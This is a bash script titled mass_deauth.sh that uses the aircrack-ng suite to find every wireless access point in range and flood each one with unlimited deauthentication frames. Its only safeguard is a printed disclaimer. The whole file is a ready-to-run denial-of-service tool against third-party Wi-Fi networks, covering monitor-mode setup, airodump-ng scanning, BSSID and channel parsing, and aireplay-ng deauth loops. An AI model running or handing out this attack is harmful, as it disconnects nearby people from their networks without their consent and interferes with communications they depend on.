#!/bin/bash
#Title: mass_deauth.sh
#Description: Mass Deauth is a bash script for Linux systems that automates the process of deauthenticating all wireless networks in an area with the aircrack-ng suite.
#Author: DENNISDGR
#Version: 1.0.0

# Check for root
user=$(whoami)

if [[ $user != "root" ]]; then

    echo "Must execute as root!"

else

    # Create a dir to save temp data
    mkdir .MassDeauthTemp

    # Ask the user for the interface they want to perfom the attack with
    read -p "Wi-Fi interface to use:  " interface

    # Check which bands the interface supports
    if iwlist $interface freq | grep -q ": 5.* GHz"; then
        echo "Checking Supported bands..."
        sleep 5
        clear
        echo "Interface $interface supports both 2.5Ghz and 5GHz bands!"
        band="--band abg"
    else
        echo "Checking Supported bands..."
        sleep 5
        clear
        echo "Interface $interface doesn't support 5GHz band!"
        band="--band bg"
    fi



    # Check if the interface is in monitor or managed mode and 
    sleep 5
    clear
    echo "Checking interface mode..."
    echo ""
    mode=$(iw "$interface" info 2> /dev/null | grep type | awk '{print $2}')

    # If the interface is not in monitor mode set it
    if [[ ${mode^} != "Monitor" ]]; then
        echo "Interface $interface is in managed mode."
        echo ""
        sleep 2
        echo "Setting interface $interface into monitor mode..."
        echo""
        systemctl stop NetworkManager
        ifconfig $interface down
        iwconfig $interface mode monitor
        ifconfig $interface up
        sleep 2
        echo "Interface $interface is now in monitor mode."
     else
        echo "Interface $interface is already in monitor mode."
    fi

    # Do a last check to make sure the user wants to proceed
    echo ""
    echo "This is your last chance make sure you are allowed to perform attacks against all APs in your area. I am NOT responsible for any of the actions done with this tool!"
    echo ""
    read -n1 -s -r -p "Press [Enter] to start dumping the needed info or [Esc] to exit." key
    if [ "$key" = '' ]; then
        clear
        echo "Starting airodump scan to find nearby APs."
        echo ""
        echo "Press [Ctrl + C] on the second window when you are ready to stop scanning and start the attack."
        xterm -T "Dumping all APs nearby with airodump-ng" -geometry 110x30 -e airodump-ng $band wlan0 -w .MassDeauthTemp/dump --output-format csv
    elif [ "$key" = $'\e' ]; then
        echo ""
        echo ""
        echo "Good choice"
        rm -rf .MassDeauthTemp
        exit 0
    fi

    # Collect all the BSSIDs from the airodump file 
    grep -Eo "^.{17}" .MassDeauthTemp/dump-01.csv > .MassDeauthTemp/all_BSSIDs
    sed -i '/^BSSID/d' .MassDeauthTemp/all_BSSIDs
    sed -i '/Station/,$d' .MassDeauthTemp/all_BSSIDs

    # Collect all the channels corresponding to the above BSSIDs
    sed 's/^.\{61\}//' .MassDeauthTemp/dump-01.csv > .MassDeauthTemp/all_channels
    sed -i -r 's/\s+//g' .MassDeauthTemp/all_channels
    sed -i 's/,.*$//' .MassDeauthTemp/all_channels
    sed -i '/^cy/d' .MassDeauthTemp/all_channels
    sed -i '/s/,$d' .MassDeauthTemp/all_channels
    grep -v -e '^[[:space:]]*$' .MassDeauthTemp/all_channels > .MassDeauthTemp/all_channels_nospace

    # Print all APs found and the channels they exist
    echo ""
    cat .MassDeauthTemp/all_BSSIDs
    echo ""
    cat .MassDeauthTemp/all_channels_nospace

    # Starting the deauth process for every AP that has been found 
    BSSIDs=".MassDeauthTemp/all_BSSIDs"
    Channels=".MassDeauthTemp/all_channels_nospace"
    LinesChall=$(cat $Channels)
    for LineChall in $LinesChall
    do
        sleep 5
        timeout 5s xterm -T "Going to correct channel" -geometry 110x30 -e airodump-ng wlan0 $band -c $LineChall &
        sleep 1
        BSSID=$(head -n 1 .MassDeauthTemp/all_BSSIDs)
        sed -i -n '1!p' .MassDeauthTemp/all_BSSIDs
        xterm -T "Deauthenticating $BSSID" -e aireplay-ng wlan0 --deauth 0 -a $BSSID &
    done
    echo ""
    read -n1 -s -r -p "Press [Enter] to stop the attack and exit the script." key
    echo ""

    # Waiting for user to exit
    if [ "$key" = '' ]; then
        kill $(jobs -p) > /dev/null
        rm -rf .MassDeauthTemp
        exit 0
    fi
fi